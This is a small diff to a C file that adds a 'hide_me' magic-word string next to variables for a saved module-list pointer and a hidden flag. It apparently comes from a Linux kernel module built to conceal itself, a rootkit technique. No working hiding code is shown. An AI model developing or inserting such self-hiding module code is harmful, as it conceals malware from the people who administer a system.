@@ -7,6 +7,8 @@
 
 #include "stdlib.h"
 
+char* MAGIC_WORD = "hide_me";
+
 static struct list_head *prev_module = NULL;
 
 bool module_is_hidden = false;
